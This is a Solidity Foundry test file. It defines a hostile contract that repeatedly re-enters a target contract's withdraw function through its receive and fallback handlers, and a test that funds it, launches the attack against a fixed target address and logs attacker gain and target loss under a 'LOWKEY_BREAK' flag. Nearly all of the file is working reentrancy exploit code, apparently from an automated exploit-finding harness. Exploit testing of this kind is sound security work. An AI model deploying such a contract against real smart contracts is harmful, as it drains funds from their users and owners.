// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

contract LowkeyBreakReentrant {
    address public immutable target;
    bytes public payload;
    uint256 public attempts;
    uint256 public successes;

    constructor(address _target) {
        target = _target;
    }

    function setPayload(bytes calldata _payload) external {
        payload = _payload;
    }

    function seed(bytes calldata data) external payable {
        (bool ok, ) = target.call{value: msg.value}(data);
        require(ok, "seed call reverted");
    }

    function attack() external payable {
        (bool ok, ) = target.call{value: msg.value}(payload);
        require(ok, "outer attack reverted");
    }

    receive() external payable {
        _reenter();
    }

    fallback() external payable {
        _reenter();
    }

    function _reenter() internal {
        if (attempts >= 3) return;
        attempts++;
        (bool ok, ) = target.call(payload);
        if (ok) successes++;
    }
}

contract LowkeyBreakReentrancy is Test {
    address constant TARGET = address(uint160(0x005fbdb2315678afecb367f032d93f642f64180aa3));

    function test_break_reentrancy() public {
        LowkeyBreakReentrant hostile = new LowkeyBreakReentrant(TARGET);
        bytes memory payload = abi.encodeWithSignature("withdraw(address,uint256)", address(hostile), 1);
        hostile.setPayload(payload);
        vm.deal(address(this), 100 ether);
        vm.deal(address(hostile), 100 ether);

        bytes memory setupData = abi.encodeWithSignature("deposit()");
        (bool seeded, ) = address(hostile).call{value: 2 wei}(
            abi.encodeWithSignature("seed(bytes)", setupData)
        );
        console2.log("SETUP_SEEDED", seeded);

        uint256 beforeHostile = address(hostile).balance;
        uint256 beforeTarget = TARGET.balance;

        (bool outer, ) = address(hostile).call{value: 1 wei}(
            abi.encodeWithSignature("attack()")
        );

        uint256 afterHostile = address(hostile).balance;
        uint256 afterTarget = TARGET.balance;
        uint256 received = afterHostile > beforeHostile ? afterHostile - beforeHostile : 0;
        uint256 targetLoss = beforeTarget > afterTarget ? beforeTarget - afterTarget : 0;

        console2.log("LOWKEY_BREAK_FAMILY", "reentrancy");
        console2.log("OUTER_SUCCESS", outer);
        console2.log("REENTRY_ATTEMPTS", hostile.attempts());
        console2.log("REENTRY_SUCCESSES", hostile.successes());
        console2.log("ATTACKER_RECEIVED", received);
        console2.log("TARGET_LOSS", targetLoss);

        if (hostile.successes() > 0 && received > 1 wei && targetLoss > 1 wei) {
            console2.log("LOWKEY_BREAK", true);
        } else {
            console2.log("LOWKEY_BREAK", false);
        }
    }
}
